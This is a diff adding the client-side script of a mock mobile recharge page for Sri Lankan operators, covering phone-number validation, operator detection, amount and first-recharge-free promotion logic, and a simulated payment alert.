+          "Fill in the details on the left to preview your reload.";
+        return;
+      }
+
+      const parts = [];
+
+      if (selectedOperator) parts.push(selectedOperator);
+      if (phoneInput.value.trim()) parts.push(phoneInput.value.trim());
+
+      const amount =
+        selectedAmount ||
+        (customAmount.value ? parseFloat(customAmount.value) || 0 : 0);
+
+      if (amount) parts.push(formatLKR(amount));
+      if (isFirstFreeEligible && freeApplied) parts.push("First recharge free");
+
+      summaryCaption.textContent = parts.join(" • ") || "";
+    }
+
+    function validatePhone() {
+      const raw = phoneInput.value.trim();
+      let digits = raw.replace(/\D/g, "");
+
+      let localNumber = "";
+      let prefix = null;
+
+      if (!digits) {
+        phoneError.style.display = "none";
+        phoneStatusDot.classList.remove("ok");
+        phoneOperatorHint.textContent = "Awaiting number…";
+        summaryTo.textContent = "—";
+        phoneWrap.style.borderColor = "var(--border)";
+        return false;
+      }
+
+      if (digits.startsWith("94")) {
+        localNumber = digits.slice(2);
+      } else if (digits.startsWith("0")) {
+        localNumber = digits.slice(1);
+      } else {
+        localNumber = digits;
+      }
+
+      if (localNumber.length >= 2) {
+        prefix = localNumber.slice(0, 2);
+      }
+
+      const isValid =
+        localNumber.length === 9 && /^[1-9][0-9]{8}$/.test(localNumber);
+
+      if (isValid) {
+        phoneError.style.display = "none";
+        phoneStatusDot.classList.add("ok");
+        phoneWrap.style.borderColor = "rgba(34,197,94,0.8)";
+      } else {
+        phoneError.style.display = "block";
+        phoneStatusDot.classList.remove("ok");
+        phoneWrap.style.borderColor = "rgba(248,113,113,0.85)";
+      }
+
+      if (isValid) {
+        const formatted =
+          "0" +
+          localNumber.slice(0, 2) +
+          " " +
+          localNumber.slice(2, 5) +
+          " " +
+          localNumber.slice(5);
+        summaryTo.textContent = formatted;
+
+        const detectedOperator = operatorPrefixMap[prefix] || null;
+
+        if (detectedOperator && !selectedOperator) {
+          selectOperator(detectedOperator, true);
+        } else if (detectedOperator && selectedOperator !== detectedOperator) {
+          phoneOperatorHint.textContent = `Number looks like ${detectedOperator}`;
+        } else if (!detectedOperator) {
+          phoneOperatorHint.textContent = "Valid number · Unknown operator";
+        }
+      } else {
+        summaryTo.textContent = "—";
+      }
+
+      updateSummaryCaption();
+      return isValid;
+    }
+
+    function getCurrentAmount() {
+      if (selectedAmount) return selectedAmount;
+      if (customAmount.value) {
+        const amt = parseFloat(customAmount.value);
+        if (!isNaN(amt)) return amt;
+      }
+      return 0;
+    }
+
+    function validateAmount() {
+      let amount = getCurrentAmount();
+
+      if (!amount || isNaN(amount) || amount < 50) {
+        amountError.style.display = "block";
+        summaryAmount.textContent = formatLKR(0);
+        summaryFee.textContent = formatLKR(0);
+        summaryTotal.textContent = formatLKR(0);
+        summaryPromoRow.style.display = "none";
+        freeApplied = false;
+        paymentHint.textContent = "Secure online payment";
+        summaryPayment.textContent =
+          selectedPaymentMethod === "card"
+            ? "Card · Visa / Mastercard"
+            : "e-Wallet ";
+        updateSummaryCaption();
+        return false;
+      }
+
+      amountError.style.display = "none";
+
+      const fee = 0; // 0 fee
+      let discount = 0;
+
+      if (isFirstFreeEligible) {
+        discount = amount; // full amount free
+        freeApplied = true;
+      } else {
+        freeApplied = false;
+      }
+
+      const total = amount + fee - discount;
+
+      summaryAmount.textContent = formatLKR(amount);
+      summaryFee.textContent = formatLKR(fee);
+
+      if (discount > 0) {
+        summaryPromoRow.style.display = "flex";
+        summaryPromo.textContent = "-" + formatLKR(discount);
+        summaryTotal.textContent = formatLKR(total);
+        paymentHint.textContent = "No payment needed · first recharge is free";
+        summaryPayment.textContent = "No payment needed · first recharge free";
+        submitText.textContent = "Claim free recharge";
+      } else {
+        summaryPromoRow.style.display = "none";
+        summaryTotal.textContent = formatLKR(total);
+        paymentHint.textContent = "Secure online payment";
+        summaryPayment.textContent =
+          selectedPaymentMethod === "card"
+            ? "Card · Visa / Mastercard"
+            : "e-Wallet (mock)";
+        submitText.textContent = "Proceed to payment";
+      }
+
+      updateSummaryCaption();
+      return true;
+    }
+
+    operatorCards.forEach((card) => {
+      card.addEventListener("click", () => {
+        selectOperator(card.dataset.operator);
+      });
+    });
+
+    phoneInput.addEventListener("input", validatePhone);
+    phoneInput.addEventListener("blur", validatePhone);
+
+    amountBtns.forEach((btn) => {
+      btn.addEventListener("click", () => {
+        amountBtns.forEach((b) => b.classList.remove("selected"));
+        btn.classList.add("selected");
+        selectedAmount = parseFloat(btn.dataset.amount);
+        customAmount.value = "";
+        validateAmount();
+      });
+    });
+
+    customAmount.addEventListener("input", () => {
+      amountBtns.forEach((b) => b.classList.remove("selected"));
+      selectedAmount = 0;
+      validateAmount();
+    });
+
+    paymentPills.forEach((pill) => {
+      pill.addEventListener("click", () => {
+        paymentPills.forEach((p) => p.classList.remove("selected"));
+        pill.classList.add("selected");
+        selectedPaymentMethod = pill.dataset.method;
+
+        if (!isFirstFreeEligible || !freeApplied) {
+          summaryPayment.textContent =
+            selectedPaymentMethod === "card"
+              ? "Card · Visa / Mastercard"
+              : "e-Wallet (mock)";
+        }
+      });
+    });
+
+    rechargeTypeButtons.forEach((btn) => {
+      btn.addEventListener("click", () => {
+        rechargeTypeButtons.forEach((b) => b.classList.remove("active"));
+        btn.classList.add("active");
+        selectedRechargeType = btn.dataset.type;
+        const label =
+          selectedRechargeType === "prepaid"
+            ? "Prepaid reload"
+            : "Postpaid bill payment";
+        summaryService.textContent = label;
+        updateSummaryCaption();
+      });
+    });
+
+    submitBtn.addEventListener("click", () => {
+      const phoneOk = validatePhone();
+      const amountOk = validateAmount();
+
+      if (!selectedOperator) {
+        showToast("Please select an operator (Dialog, Mobitel, Hutch or Airtel).");
+      }
+      if (!phoneOk || !amountOk || !selectedOperator) {
+        return;
+      }
+
+      const amount = getCurrentAmount();
+      const isFreeOrder = isFirstFreeEligible && freeApplied && amountOk;
+
+      submitBtn.disabled = true;
+      submitText.innerHTML = "";
+      const spinner = document.createElement("div");
+      spinner.className = "btn-spinner";
+      submitBtn.prepend(spinner);
+      submitText.textContent = "Processing…";
+
+      setTimeout(() => {
+        submitBtn.disabled = false;
+        spinner.remove();
+        submitText.textContent = isFreeOrder ? "Claim free recharge" : "Proceed to payment";
+
+        const paymentLine = isFreeOrder
+          ? "Payment: FREE (first recharge offer)"
+          : "Payment method: " +
+            (selectedPaymentMethod === "card"
+              ? "Card · Visa / Mastercard"
+              : "e-Wallet (mock)");
+
+        const message = `
+Mock payment created:
+• Operator: ${selectedOperator}
+• Number: ${summaryTo.textContent}
+• Type: ${
+          selectedRechargeType === "prepaid" ? "Prepaid reload" : "Postpaid bill"
+        }
+• Amount: ${summaryTotal.textContent}
+• ${paymentLine}
+        `.trim();
+
+        alert(message);
+
+        if (isFreeOrder && !hasConsumedFirstFree) {
+          try {
+            localStorage.setItem("reloadFirstFreeUsed", "1");
+          } catch (e) {}
+          hasConsumedFirstFree = true;
+          isFirstFreeEligible = false;
+          freeApplied = false;
+          updateFirstFreeUI();
+          validateAmount(); // refresh summary without free promo for next time
+          showToast("First recharge offer used. Next reload will be billed normally.");
+        }
+      }, 1400);
+    });
+  </script>
+</body>
+</html>
